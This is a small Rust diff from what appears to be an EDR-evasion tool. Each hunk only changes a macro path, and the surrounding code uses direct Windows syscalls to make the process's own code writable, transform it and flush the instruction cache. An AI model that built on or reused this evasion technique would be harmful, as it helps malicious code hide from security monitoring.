@@ -978,7 +978,7 @@ fn hash_text(text: &[u8]) -> String {
 #[cfg(windows)]
 unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
     let mut old_protect: u32 = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtProtectVirtualMemory",
         (-1i64) as u64, // NtCurrentProcess()
         &mut (base as *mut std::ffi::c_void),
@@ -998,7 +998,7 @@ unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
 #[cfg(windows)]
 unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
     let mut old_protect: u32 = 0;
-    let status = syscall!(
+    let status = crate::syscall!(
         "NtProtectVirtualMemory",
         (-1i64) as u64, // NtCurrentProcess()
         &mut (base as *mut std::ffi::c_void),
@@ -1249,7 +1249,7 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     // Step 10: Flush instruction cache (Windows).
     #[cfg(windows)]
     {
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtFlushInstructionCache",
             std::ptr::null_mut::<std::ffi::c_void>(), // current process
             text_ptr as *mut std::ffi::c_void,
